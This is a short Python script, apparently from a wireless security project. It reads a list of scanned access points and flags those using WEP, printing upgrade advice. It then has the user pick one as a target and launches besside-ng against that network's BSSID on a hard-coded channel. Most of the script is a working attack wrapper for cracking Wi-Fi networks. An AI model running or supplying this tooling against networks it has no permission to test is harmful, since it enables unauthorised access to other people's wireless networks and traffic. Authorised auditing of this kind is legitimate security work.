import subprocess, time, csv, sys, shutil, os

def identify_wep():
    file_path = "/mnt/data/access_points.txt"
    try:
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            vulnerable_aps = []
            for row in csv_reader:
                if "WEP" in row[1]:  # Assuming the encryption standard is in the second column
                    vulnerable_aps.append(row)
            if vulnerable_aps:
                print("Vulnerable Access Points Found:")
                for ap in vulnerable_aps:
                    print(f"SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")
                    print("Vulnerability: Uses WEP encryption, which is outdated and easily cracked.")
                    print("Remediation: Upgrade to WPA3 or at least WPA2 encryption.\n")
            else:
                print("No vulnerable access points found using WEP encryption.")
    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
    except Exception as e:
        print(f"An error occurred while analyzing vulnerabilities: {e}")

def target_ap():
    file_path = "/mnt/data/access_points.txt"
    try:
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            wep_aps = []
            for row in csv_reader:
                if "WEP" in row[1]:  # Assuming the encryption standard is in the second column
                    wep_aps.append(row)

            if wep_aps:
                print("Select a Vulnerable Access Point by its index number:")
                for index, ap in enumerate(wep_aps):
                    print(f"{index}: SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")

                # Assuming the selection process is outside of this function, as it would need user input.
                # User should replace `selected_index` with the actual selection mechanism, e.g., input from the user.
                selected_index = int(input("Enter the index number of the target AP: "))
                if 0 <= selected_index < len(wep_aps):
                    selected_ap = wep_aps[selected_index]
                    return selected_ap[2], selected_ap[0]  # Returning ESSID and BSSID
                else:
                    print("Invalid index selected.")
                    return None, None
            else:
                print("No vulnerable access points found using WEP encryption.")
                return None, None

    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
        return None, None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None, None

def main(ap_mac, interface):
    # Hard coded channel for the project; don't have time to set dynamically
    channel = "6"

    command = ["besside-ng", "-c", channel, "-b", ap_mac, interface, "-v"]

    try:
        subprocess.run(command)
    except KeyboardInterrupt:
        print("Command interrupted by user.")
